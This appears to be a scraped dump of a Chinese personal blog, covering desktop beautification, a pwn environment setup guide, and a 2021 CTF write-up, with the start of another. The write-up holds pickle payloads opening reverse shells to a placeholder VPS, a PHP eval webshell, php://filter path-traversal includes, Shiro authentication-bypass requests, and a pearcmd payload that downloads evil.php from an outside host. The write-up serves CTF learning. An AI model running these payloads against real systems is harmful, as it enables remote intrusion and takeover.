当然用的是xx一键root工具之类的，结果刚刷好一会就变砖了 = =（当然这不重要）\n初中之后手机也换成了小米，更是三天两头的刷主题商店 构思怎么混搭出最好看的个性主题，但是也就止步于此 高中之后课余时间变少，也慢慢没有空对自己的手机好好的美化 电脑更是不怎么用了；其间倒是倒腾过一段时间的钢笔彩墨 现在还有不少囤货，坛水呀 鲶鱼呀 百乐呀 还有很多其他牌子的墨现在还都在书桌的台子上，各种 花里胡哨又毫无卵用十分好看的笔现在也被相当规整的收在了用作展示的亚克力架子上（是一种可以斜着放笔的架子 图片如下 我有6个这样的收纳笔筒 勉强够放我的笔们）包括很多很贵的限定笔TAT 现在回头再看好心疼钱 太败家了\n兜兜转转，直到大一的寒假才再把手机和电脑方面的美化给拾起来，然而活力和劲头不减当年\n前几天搭博客的时候就想 除了wp和一些学习笔记之外，还有什么是既值得自己记录 又值得分享出来的呢？ （虽然并没有人会看就是了） 脑子里第一个蹦出来的就是\u0026quot;beautify\u0026quot;——这是最最适合不过的了！！！\n所以先简单概述一下现状 目前的手机是小米10，备用机是小米5sp（没错 就是那个骁龙825发热狂魔……无比后悔当时因为小米6没有3.5mm耳机孔而毅然决然地选择了它）电脑是小新pro16独显版，综合性能都还可以\n手机和电脑作为平时的主要生产力工具，美化的方向和注意点主要有这么几个：\n色彩搭配要合理，空间结构要有序 有轻巧的快捷小工具来提高效率 自己用着得称心顺手，不随波逐流去选择过于繁杂的美化方式 兼具颜值和实用性，工具最终服务于人，不追求颜值而牺牲性能 所以基于以上的 “圣经”“美化思路”，本篇先从我的pc简单说起吧(ゝ∀･)☆\n————预警：可能会很长很长，大概率之后会修修补补形成一个连~续~剧~\n深色模式？亮色模式！ （先给自己叠层甲）手机上我设置晚上11点以后自动深色模式并且非常喜欢这个功能，让我晚上看手机不再眼瞎\n但是！！！但是！！！使用pc的场景都是环境灯光正常的情况，在这样的情况下深色底配上白色/花里胡哨色的代码真的不会让人眼晕吗！！！我是完全接受不来，哒咩！！！\n所以我的各种terminal\u0026amp;ide\u0026amp;其它种种的配色，全 部 都 是 亮色模式\nkali 这个颜值不用多说吧（\nubuntu vscode 主题：Github Light Theme\nidea 一些基础观念 配色必须统一 一张图就明白了\nedge我喜欢垂直标签页，会让显示空间变大，开四五十个标签页的时候侧栏也不会拥挤，主题是冰凉的薄荷；Chromium的主题是Sea Foam\nedge曾经我觉得一个痛点是不能给标签页分组，直到最近的更新上了这个功能，那这就没啥说的了，在我心中已经超越了Chrome，edge天下第一！\n桌面必须简洁 背景图id=89931517，隐藏了桌面图标和底边任务栏（alt+tab 或者三指的触摸手势要比点击切换应用页面更方便（况且平时只显示桌面的情景很少，大部分情况下都是开一堆堆的页面\nwin10的磁贴我真的太爱了\n除了偶尔会出Bug 重启个系统结果我排好的顺序全整没了😅崩过好几次了已经\n有些工具在文件夹中，就没有全贴上来了，完整的形态应该是一个心型~\n指针必须花哨 有谁能拒绝小豆泥呢！\nshell\u0026amp;terminal zshell zhell多好用不用我多说吧？kali默认的就是zshell，高亮、代码补全等功能是真的太贴心了，bash跟它一比真是相形见绌，所以我的linux虚拟机以及vps都上了zhell\u0026amp;oh-my-zsh；试了一些主题，但还是默认的robbyrussell深得我心……\n只有皮肤也不行，还得配上给力的插件——zsh-syntax-highlighting（语法高亮）和zsh-autosuggestions（根据历史记录自动补全）\nwindows terminal win自带的cmd和powershell，只能说懂得都懂——一个是大黑框一个是大蓝框，前者简陋至极，后者的报错页面（蓝底红字）看着能让人心跳骤停，即使我已经尽力设置背景透明、显示的颜色，出来的效果也不尽人意\n这时Terminal这个神奇的东西就来救场了——配合pwsh7\u0026amp;oh-my-posh几乎可以达到类zsh的体验\n此处的shell主题是ys（对没看错 就是zsh下很火的那个），背景图id=89393158，配色方案是ayu_light，字体是12号Cascadia Code PL；加载了posh-git和oh-my-posh模块，并设置了PSReadLine\n这样一来我们的pwsh也有了根据历史记录自动补全、tab选择目录这样的功能（更多的功能可以参照官方文档自行设置）\n同时**win+`**这个快捷键可以呼出临时停靠窗口“焦点终端”\n对临时想要执行个脚本、连以下vps、查个东西什么的简直不能更方便！\n同时它还支持通过json来添加配置文件，可以将自己的vps直接加进来\n再设置ssh-key就可以一键免密登录啦了！\n唯一的缺憾，就是不像final shell一样有很好的文件上传下载以及ftp的功能，不然可以直接革了其它ssh终端的命（说的就是你 finalshell）\n必不可少的小工具 everything 曾经年少轻狂的我固执的认为这种东西是给命名文件不规范的人准备的\n后来我发现我错了……everything真香！！！！\n它能非常非常迅速的找到我想要的文件，还能进行预览，太好用了简直是\nSnipaste 最强截图工具了，截图后可以贴在屏幕上，调整大小、透明度、简单的涂鸦标注都不在话下，占用内存也比较小，装机必备~\nCClose 又一个装机必备了\n就说这些功能还有谁不心动！！！！！！内存占用也很小，可以说极大的提升了我平常的学习效率\n（建议自启动+以管理员模式开启（防止某些过了UAC的应用它没有权限\nDigital Clock 就是这个会一直出现在我各种截图中的小部件\n够简单，这个大小放在屏幕上也十分合适，还可以设置透明度 不会挡到文字\n但是不知道从什么时候开始在关机的时候会报个错，然后不会保存我已设置好的颜色方案，导致再次开机后需要重新设置\n另外这玩意的内存占用竟然有16M……感觉跟功能并不是十分匹配啊 就只不过在屏幕上层显示而已（但是很可惜没有找到适合的替代品TAT\n*TileBeautify 磁贴美化工具，可以将磁贴换成任意的图片，进行组合之后会很好看\n（但是吧 我换电脑之后就没折腾这个了 因为不方便\n说实话这篇文档的创建时间是\n别骂了，都是我太懒狗\n之后一定会认真起来的，不管是学习上，生活上，还是个人的发展上\n每天做题什么的，发现自己是真的菜，是真的铁沸物，跟大家比起来我真的水平太低了，是不值一提的那种\n害，不多说了\n跟别人学，和自己比\n","date":"2021-10-28T13:42:14+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/beautify-my-pc/","section":"posts","tags":[],"title":"生产力提(mei)高(hua)之路"},{"categories":["环境配置","pwn"],"contents":"以下为Ubutun16.04\u0026amp;py2的安装过程，其他版本命令几乎相同的~（Ubuntu20\u0026amp;py3的我也装了一个，毕竟py3是主流，技术总是向前发展的嘛~）\n————毕竟我是以初学者的视角来准备pwn的环境，肯定还有很多不全面\u0026amp;想不到的地方，之后用到了会回来补上的~\n安装pip2\u0026amp;pip3\u0026amp;ipython\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py sudo python get-pip.py # sudo apt-get install python3-pip curl https://bootstrap.pypa.io/pip/3.5/get-pip.py -o get-pip.py sudo python3 get-pip.py sudo apt-get install ipython 安装py2的pwntools\npip2 install pathlib2 # py3无需此条 pip2 install pwntools 安装GDB\u0026amp;插件\nsudo apt-get install git git clone https://github.com/pwndbg/pwndbg.git ./setup.sh # 使用peda-heap git clone https://github.com/Mipu94/peda-heap.git echo \u0026#34;source ~/GDB-Plugins/peda-heap/peda.py\u0026#34; \u0026gt; ~/.gdbinit # 使用peda git clone https://github.com/longld/peda.git echo \u0026#34;source ~/GDB-Plugins/peda/peda.py\u0026#34; \u0026gt; ~/.gdbinit # 使用gef git clone https://github.com/hugsy/gef.git echo \u0026#34;source ~/GDB-Plugins/gef/gef.py\u0026#34; \u0026gt; ~/.gdbinit # 使用pwndbg echo \u0026#34;source ~/GDB-Plugins/pwndbg/gdbinit.py\u0026#34; \u0026gt; ~/.gdbinit # 自动切换脚本 https://blog.csdn.net/aptx4869_li/article/details/81566541 安装one_gadget\nsudo apt-add-repository ppa:brightbox/ruby-ng sudo apt-get update sudo apt-get install ruby2.7 ruby2.7-dev sudo apt-get install gem sudo gem install one_gadget 安装32位库\nsudo apt-get install lib32ncurses5 sudo apt install libc6-dev-i386 sudo apt-get install lib32z1 安装checksec\nsudo apt instal checksec 安装seccomp-tools\nsudo gem install seccomp-tools 安装zshell\u0026amp;插件\nsudo apt-get install zsh sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; # zsh-syntax-highlighting git clone https://github.com/zsh-users/zsh-syntax-highlighting.git echo \u0026#34;source ${(q-)PWD}/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh\u0026#34; \u0026gt;\u0026gt; ${ZDOTDIR:-$HOME}/.zshrc source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh # zsh-autosuggestions git clone https://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh # 如遇报错 error: RPC failed; result=35, HTTP code=0; fatal: The remote end hung up unexpectedly # 将git clone https://xxxx/xxxx.git 换为git clone git://xxxx/xxxx.git 安装virtualbox增强功能\n# 遇报错 unable to access “VBox_GAS_6.0.0 iso9660” sudo apt-get install --reinstall linux-image-$(uname -r) 最后结果\nubuntu20+py3+zsh（应该能看出来我更喜欢这个x\nubuntu16+py2\n第一次装的时候直接卡在了pwntools上，后来发现原因是pip2版本过低且无法直接通过pip -m pip install --upgrade pip进行升级，只能手动下载get-pip.py后通过py2运行来安装\n这次配完之后最大的感触就是该换个大一点的硬盘了，512G属实绷不住我搞这么多虚拟机……\n之后可能会抽空学一下pwn，属于是web狗卷不动了要给自己找个后路（虽然百分之九十九的概率是两个都很菜，xs），卷起来卷起来！！！\n","date":"2021-10-28T00:41:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/28/pwn-env-init/","section":"posts","tags":["pwn"],"title":"pwn环境配置"},{"categories":["CTF"],"contents":" web有3个都是有了包浆的原题……还有一点脑洞题，反正奇奇怪怪的\n属于是被师傅们带飞了，所以详细的wp还是自己写一写，认真地复现一下\nzerocalc emmmmmm 说实话一开始没有出 因为没悟出来它这是个什么逻辑2333333\nezPickle # 用pker.py生成payload notadmin=GLOBAL(\u0026#39;config\u0026#39;,\u0026#39;notadmin\u0026#39;) notadmin[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; exec=GLOBAL(\u0026#39;config\u0026#39;,\u0026#39;backdoor\u0026#39;) payload=\u0026#39;\u0026#39;\u0026#39;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#39;\u0026#39;\u0026#39; exec(payload) return \u0026gt;\u0026gt;\u0026gt; data=b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\\\\\\\u0026#39;subprocess\\\\\\\u0026#39;).call(\u0026#34;echo -e \\\\\\\u0026#39;#!/bin/bash\\\\\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\\\\\\\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\u0026#34;,shell=True)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; \u0026gt;\u0026gt;\u0026gt; print(base64.b64encode(data)) b\u0026#39;xxxxxxxxxx\u0026#39; 没什么好说的，基础的pickle题，是2021巅峰极客what_pickle的阉割版（构造的思路几乎一样 但是简单很多），几乎一样的题目还有 [SUCTF 2019]Guess Game\n限制的点在于只允许引入题目自设模块\u0026amp;限制模块中含下划线，那就直接变量覆盖，然后利用给出的eval()弹shell就好了\n————另外这里的payload也可以是简短版本的弹sehll的payload 不唯一嘛\ndata = b\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0g2\\n(g3\\ntR.\u0026#39; 一个需要注意的点是由于这里的反序列化入口是get传参，所以遇到+号会出问题，传进去之前要先urlencode(encode all special chars)\n————顺带练个手，搓一个不含b'R'的opcode（用b'o'代替）\ndata = b\u0026#39;\u0026#39;\u0026#39;cconfig\\nnotadmin\\np0\\n0g0\\nS\\\u0026#39;admin\\\u0026#39;\\nS\\\u0026#39;yes\\\u0026#39;\\nscconfig\\nbackdoor\\np2\\n0S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;bash -c \\\\\\\u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/you_vps_ip/port \u0026lt;\u0026amp;1\\\\\\\u0026#39;\u0026#34;)\\\u0026#39;\\np3\\n0(g2\\ng3\\no.\u0026#39;\u0026#39;\u0026#39; 传参的时候记得再urlencode一下~~~\n————之前我的总结笔记已经相当全面了 可以出CTF教科书了233333\nJack-Shiro 属于是原题了属于是属于是属于是烤烂了已经，参见 [红明谷CTF 2021] JavaWeb | [天翼杯 2021] jackson | [NPUCTF2020] EzShiro （虽然我自己根本没发现 实在是做过的题太少了 java更是不会 我的\n/login下有个登录，回显/json，返回的cookie有个rememberMe=deleteMe，可以知道是shiro\n访问/json，后面会带一堆get请求的参数，用/;/json绕过（cve-2020-11989）\n上工具JNDI-Injection-Exploit一把梭（问题出在我vps上没有java环境 端口转发又处了亿点点问题…… 所以没有带出来flag），是cve-2020-36188\n哭哭\n还有个工具是 LdapBypassJndi，差不多的；下面是跟一跟涉及到的几个链子\nCVE-2020-11989 参考：Apache Shiro权限绕过漏洞分析(CVE-2020-11989) | Apache Shiro 身份验证绕过漏洞 (CVE-2020-11989)\nApache Shiro是一个常用的java安全框架，在1.5.3之前版本中当Shiro与Spring动态控制器一起使用时（Spring框架中只用Shiro鉴权），如果直接访问/shiro/admin/page会302跳转要求登录，而访问/;shiro/admin/page即可绕过权限验证，访问/admin的信息\n本地环境搭建\u0026amp;复现 有带佬直接写好的docker可以直接pull拿来用\ndocker pull jackey0/cve-2020-11989 docker run -p 8426:8080 \u0026lt;image\u0026gt; /bin/sh -c \u0026#39;java -jar /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; docker pull jackey0/cve-2020-13933 // docker start \u0026lt;container-id\u0026gt; 或者下载l3yx/springboot-shiro项目到本地编译为war包（或者也有编译好的shiro.war）之后手动放入tomcat下的webapps目录下运行。显然docker太香了！！！！！\n访问映射到外部的8426端口，环境搭建完毕\npost方式请求/doLogin页面，看到cookie中含rememberMe=deleteMe，确定为shiro\n访问/admin/page页面，302重定向至/login页面要求登录\n访问/;/admin/page页面，绕过鉴权，回显admin page\n源码分析\u0026amp;动调 先把jar包下载到在本地，导入idea\ndocker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ 使用idea远程对docker中部署的springboot项目进行debug\ndocker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; Shiro的权限校验是通过判断url的匹配来进行的，如果Shiro获取的url和web框架处理的url结果不一致时就造成了权限绕过；Shiro对于url的获取和匹配在org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain中进行。\n以访问/;/admin/page为例，通过它的getPathWithinApplication()得到的requestURI=\u0026quot;/\u0026quot;\n跟入此函数的处理逻辑org.apache.shiro.web.util.WebUtils#getPathWithinApplication，进入getRequestUri()\n我们可以看到在中间过程中uri=\u0026quot;/;/admin/page\u0026quot;，但是从上面我们可以知道经过normalize(decodeCleanUriString())处理过后返回的requestRUI=\u0026quot;/\u0026quot;，跟入这个函数，它先是调用decodeRequestSrting()，没有对结果产生什么影响，\n而返回时的normalize()会根据\u0026quot;;\u0026ldquo;进行url的截断处理，最终返回\u0026rdquo;/\u0026quot;\n回到开头的/;/admin/page请求，spring中处理url的函数在org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping\n它调用的是springframework中自己getPathWithinApplication()，经过一番骚操作返回的是/admin/page\n跟入getPathWitinApplication()，先是调用getContextPath()，返回\u0026quot;/\u0026quot;\n然后是getRequestUri()\n同样，在最终return之前的uri=\u0026quot;/;/admin/page\u0026quot;，经过了一个decodeAndCleanUriString()，根据ch=59也就是\u0026quot;;\u0026ldquo;符进行一个分割，使用removeSemicolonContentInternal()\n于是\u0026rdquo;;\u0026ldquo;就不见了\n然后返回\u0026rdquo;/admin/page\u0026quot;给getPathWithinApplication()\n再传递给getPathWithinServletMapping()\n最终我们访问到的页面就是\u0026quot;/admin/page\u0026quot;了\n————总结一下就是当url在shiro和spring中的处理不一致，当进入应用时被认作是访问\u0026quot;/;/admin/page\u0026quot;，不属于我们最初配置的\u0026quot;/admin/*\u0026ldquo;权限路由，而进入shiro后却被截断处理，认作是\u0026rdquo;/admin/page\u0026quot;，属于权限路由中，最终做到权限绕过\nCVE-2020-13933 由于11989的修补并不完全，导致又又又被绕过产生了13933……\n本地环境搭建\u0026amp;复现 参考：shiro \u0026lt; 1.6.0的认证绕过漏洞分析(CVE-2020-13933)\n还是采用docker形式复现（我爱docker）这里直接就是远程调试的启动命令啦，跟上面的一样配置就好了（\ndocker pull jackey0/cve-2020-13933 docker run -p 8426:8080 -p 8001:1456 3eefd8918689 /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; 访问/admin，报错页面且无302跳转；访问/login跳转到身份验证页面；访问/admin/%3bpage，无身份验证且返回admin page\n原理分析\u0026amp;动调 还是导入jar包至idea，远程debug\n直接看看shiro1.6.0的补丁补到了什么地方，在github上查看diff\n增加了InvalidRequestFilter类，有个isAccessAllowed()函数，在全局上对分号、反斜杠、非ASCII码字符进行了过滤\n以访问/admin/%3bpage为例，url先由shiro解析，还是org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain，依旧是调用getPathWithinApplication()，执行后requestURI=\u0026quot;/admin/\u0026quot;\n而之后进入springboot处理时，却变成了\u0026quot;/admin/;page\u0026quot;\n再回到最初跟一下具体的调用链\n在removeSemicolon()处理前，uri=\u0026quot;/admin/;page\u0026quot;（经decodeAndUriString()解码了）\n处理后path=\u0026quot;/admin\u0026quot;，接着调用normalize()函数变成\u0026quot;/admin\u0026quot;，传递给最初的getChain()中的requestURI参数\n之后被spring处理org.springframework.web.util.UrlPathHelper#getPathWithinServletMapping，其中会调用getRequestUri()，它会再次调用decodeAndCleanUriString()\n先removeSemicolonContent()再decodeRequestString()，那显然是怎么都去不掉\u0026quot;;\u0026ldquo;了，将\u0026rdquo;;page\u0026quot;看作一个整体\n我们回过头去看这次的权限设置是怎么匹配url的，定位到org.syclover.srpingbootshiro.LoginController和org.syclover.srpingbootshiro.ShiroConfig#shiroFilterFactoryBean\n可以看到，对于\u0026quot;/admin/*\u0026ldquo;需要鉴权，\u0026quot;/admin/{name}\u0026ldquo;返回admin page，而对于\u0026rdquo;/admin/\u0026ldquo;却没有设置权限\n从上面的调试中我们知道shiro得到的是\u0026rdquo;/admin/\u0026quot;（先decode再去除\u0026rdquo;;\u0026quot;），被认作可以访问；而spring得到的是\u0026quot;/admin/;page\u0026quot;）先去除\u0026quot;;\u0026ldquo;再decode），与\u0026rdquo;/admin/{name}\u0026ldquo;的样式匹配，最后返回admin page （简直太完美了也\n*临时修复 （本地暂时还未复现\nmap.put(\u0026#34;/admin/**\u0026#34;, \u0026#34;authc\u0026#34;); @GetMapping({\u0026#34;/admin/page\u0026#34;}) public String admin() { return \u0026#34;admin page\u0026#34;; } ***CVE-2020-36188 ch.qos.logback.core.db.JNDIConnectionSource\n可以参考 https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-Java%E7%AF%87/#NPUCTF2020-EzShiro，工具 LdapBypassJndi | JNDI-Injection-Exploit\n————由于我的java水平实在够呛，这里暂时先空着，等我学一学java 之后必定回来鞭尸\nEasyFilter \u0026lt;?php ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;./\u0026#34;); if(!isset($_GET[\u0026#39;action\u0026#39;])){ highlight_file(__FILE__); die(); } if($_GET[\u0026#39;action\u0026#39;] == \u0026#39;w\u0026#39;){ @mkdir(\u0026#34;./files/\u0026#34;); $content = $_GET[\u0026#39;c\u0026#39;]; $file = bin2hex(random_bytes(5)); file_put_contents(\u0026#34;./files/\u0026#34;.$file,base64_encode($content)); echo \u0026#34;./files/\u0026#34;.$file; }elseif($_GET[\u0026#39;action\u0026#39;] == \u0026#39;r\u0026#39;){ $r = $_GET[\u0026#39;r\u0026#39;]; $file = \u0026#34;./files/\u0026#34;.$r; include(\u0026#34;php://filter/resource=$file\u0026#34;); } /?action=w\u0026amp;c=\u0026lt;?php @eval($_POST[\u0026#39;wuhu\u0026#39;]);?\u0026gt; /?action=r\u0026amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9 POST: wuhu=phpinfo(); 对于payload的底层代码分析 原理分析来自Guoke佬 我只是个会复现的铁沸物……\n首先下一份7.2.34的源码\n定位到包装器所在的文件位置/ext/standard/php_fopen_wrapper.c，178行起是php_stream_url_wrap_php()的代码\n191行，先碰到php://会执行path += 6；之后接着349行会碰到filter/\n没有mode，此时\npath=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 357行执行strdup()，把path第6位之后的内容赋给pathdup指针上\npathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 358行strstr()返回pathdup的指针中/resource=出现的位置，到365行的判断\np+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 372行的php_strtok_r()对pathdup+1的位置以\u0026rsquo;/\u0026lsquo;为标志进行分割\np=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt 得到resource=，进373行的while循环，先是到378行的php_stream_apply_filter_list()，转至159行\n将p作为过滤器进行注册，161行php_stream_filter_append()应用到文件流上，但显然resource不是流包装器，干不了事，那就再到while循环里接着向后找，直到向后碰到read\np=/read=convert.base64-decode/resource=/../../../../../1.txt 进入374行，执行php_stream_apply_filter_list之后就变成了\np=convert.base64-decode/resource=/../../../../../1.txt 此时的p=convert.base64-decode，就可以正常的b64解码我们的内容了\n再回头看这个题 代码很短，限制在于写入的文件内容被b64加密\u0026amp;open_basedir\u0026amp;include已经写好的包装器和一部分固定的内容\n我刚开始卡在了已经写死的包装器的开头还怎么加conver.base64-decode？然后发现是我想多了，可以接着套，底层原理见上，会向后循环取值直到碰到一个正常的流包装器\n第二个问题就是目录穿越了，前面加了5层buff，从结果倒推感觉可以理解，但是自己却没试出来，我的问题\n最后open_basedir的绕过反而是最轻松的，蚁剑插件直接搞\n参考：深入理解PHP之require/include顺序 | Exploit with PHP Protocols / Wrappers | 谈一谈php://filter的妙用\nnew_hospital 响应cookie会有个API\n将API设为flag.php ZmxhZy5waHA%3d\n扫目录 得到/old/feature.php 将路径改为这个\n将API改为../flag.php Li4vZmxhZy5waHA%3d\n————其实如果先扫目录扫到/old/feature.php的话，可以将API设为./feature.php Li9mZWF0dXJlLnBocA%3d%3d 读到这一段\n后端的逻辑就是将cookie[\u0026lsquo;api\u0026rsquo;]取出，直接读出内容\n有一点点脑洞，也跟眼力见有关系，我一开始是真没注意到这个cookie的API字段，属实是有点大病；之后做题还是要开环境之后就连burp，注意观察响应头的特殊字段 cookie的类型/ctrl+u的源码/可能会有的控制台的提示信息/robots.txt这些东西，不要遗漏，不然就很可惜了\nGive_me_you_0day 这里考察的点并不是Typecho 1.1/17.10.30版本的0day（给出的源码就完全是github上的发行版），而是install.php中 608行存在一个文件包含\n利用这个文件包含的点来搞，payload可以直接参考[RCTF 2021] VerySafe\n打的点在于peclcmd，这里涉及到的题和知识害挺多，之前真没见过（dbq是我做的题太少太少了），在这里一并学习了\n关于register_argc_argv配置项 是php.ini核心配置中的一个选项，默认是这样\n手册是这样写的\n从php=4.0.0后为可设置的选项（此前总为On）默认为开启状态，当php\u0026lt;=4.2.3时可修改范围是PHP_INI_ALL，更详细的内容可以参见-\u0026gt;PHP的命令行模式\n在register_argc_argv开启的情况下，cgi和cli模式下都可以直接访问到传入的参数；其中argc是传递过去的参数的个数，argv是包含有实际参数的数组；cli模式测试如下\n\u0026lt;?php var_dump($_SERVER[\u0026#39;argv\u0026#39;]); // var_dump($HTTP_SERVER_VARS[\u0026#39;argv\u0026#39;]); var_dump($argv); cgi的话，直接用上面的$_SERVER['argv']是不会获取到值\n直接查看$_SERVER这个大数组，可以发现我们的参数在这里是以一整个QUERY_STRING的形式出现的（详细的数组解析-\u0026gt;PHP超全局变量$_SERVER的用法）\n有个特殊的trick在于，如果是\n/test.php?a=1\u0026amp;b=1 确实是两个参数，但返回的$_SERVER[\u0026lsquo;argv\u0026rsquo;]为1，如果是\n/test.php?a=1+b=1 则会被截断，返回$_SERVER[\u0026lsquo;argv\u0026rsquo;]则为2（说实话我本地真没跑出来这个 可能是哪里的配置有问题？但是看了很多资料，这里应该是可以被复现成功的………………emmmm 有一点点离谱）\n关于pear命令 pear是the PHP Extention and Application Repository的缩写，是一个PHP扩展与应用的代码仓库，pear仓库代码以包package分区，每一个pear package都是一个独立的项目，有自己独立的开发团队、版本控制、文档和其他包的依赖关系信息；pear package以phar, tar, zip形式发布，通过apt install php-pear来安装\npear命令的实现是一个sh脚本\n#!/bin/sh # first find which PHP binary to use if test \u0026#34;x$PHP_PEAR_PHP_BIN\u0026#34; != \u0026#34;x\u0026#34;; then PHP=\u0026#34;$PHP_PEAR_PHP_BIN\u0026#34; else if test \u0026#34;/usr/local/bin/php\u0026#34; = \u0026#39;@\u0026#39;php_bin\u0026#39;@\u0026#39;; then PHP=php else PHP=\u0026#34;/usr/local/bin/php\u0026#34; fi fi # then look for the right pear include dir if test \u0026#34;x$PHP_PEAR_INSTALL_DIR\u0026#34; != \u0026#34;x\u0026#34;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=\u0026#34;-d include_path=$PHP_PEAR_INSTALL_DIR\u0026#34; else if test \u0026#34;/usr/local/lib/php\u0026#34; = \u0026#39;@\u0026#39;php_dir\u0026#39;@\u0026#39;; then INCDIR=`dirname $0` INCARG=\u0026#34;\u0026#34; else INCDIR=\u0026#34;/usr/local/lib/php\u0026#34; INCARG=\u0026#34;-d include_path=/usr/local/lib/php\u0026#34; fi fi exec $PHP -C -q $INCARG -d data.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=\u0026#34;\u0026#34; -d safe_mode=0 -d register_argc_argv=\u0026#34;On\u0026#34; -d auto_prepend_file=\u0026#34;\u0026#34; -d auto_append_file=\u0026#34;\u0026#34; $INCDIR/pearcmd.php \u0026#34;$@\u0026#34; 从最后一行可以看到调用了/pearcmd.php，而这个pearcmd.php的参数$argv就来源于$_SERVER[\u0026lsquo;argv\u0026rsquo;]，这个是我们可控的传入参数\n利用pear命令执行任意文件下载 如图，直接下载开启了http服务器的目录下的指定文件到当前所在目录\n使用install -R而非download可以控制下载到任意目录，比如直接下载到web服务的目录\n所以总体思路+payload 如果存在这样的环境\n安装pear 开启register_argc_argv 存在可控的传入参数来做到文件包含（比如include $_GET['f'].php） 可以出网 我们就可以做到任意文件下载从而getshell；前面也提到register_argc_argv继续PHP_IN_PREDIR，我们可以留一个.user.ini的后门来设置register_argc_agrv为On\npayload就是这样了\n// 存在 include $_GET[\u0026#39;f\u0026#39;].php // web目录可写 - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp目录可写 - http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil 首先要包含一个正确位置的pearcmd.php（通常在/usr/local/lib/php/pearcmd.php），接着包含\u0026amp;+download+http://your_vps/eval.php（或者如果前面直接是/pearcmd.php的话就可以直接给参数了/pearcmd.php+download+http://your_vps/eval.php）来装🐎（注意路径是否正确），之后再包含我们的🐎即可\n其它的例题 [CampCTF 2015] Trolol\n[巅峰极客 2020] MeowWord\n[RCTF 2021] VerySafe\n还是做的题不够多，已有的知识也应用的不够熟练，实在是太太太太太菜了，得好好学，不能天天划水摸鱼\n","date":"2021-10-26T20:17:24+08:00","permalink":"https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/","section":"posts","tags":["wp"],"title":"2021强网拟态 Wp"},{"categories":["CTF"],"contents":"Web/迷路的魔法少女 魔法少女迷失在了代码空间 请寻找她现在在哪\n\u0026lt;?php highlight_file(\u0026#39;index.php\u0026#39;); extract($_GET); error_reporting(0); function String2Array($data) { if($data == \u0026#39;\u0026#39;) return array(); @eval(\u0026#34;\\$array = $data;\u0026#34;); return $array; } if(is_array($attrid) \u0026amp;\u0026amp; is_array($attrvalue)) { $attrstr .= \u0026#39;array(\u0026#39;; $attrids = count($attrid); for($i=0; $i\u0026lt;$attrids; $i++) { $attrstr .= \u0026#39;\u0026#34;\u0026#39;.intval($attrid[$i]).\u0026#39;\u0026#34;=\u0026gt;\u0026#39;.\u0026#39;\u0026#34;\u0026#39;.$attrvalue[$i].\u0026#39;\u0026#34;\u0026#39;; if($i \u0026lt; $attrids-1) { $attrstr .= \u0026#39;,\u0026#39;; } } $attrstr .= \u0026#39;);\u0026#39;; } String2Array($attrstr); 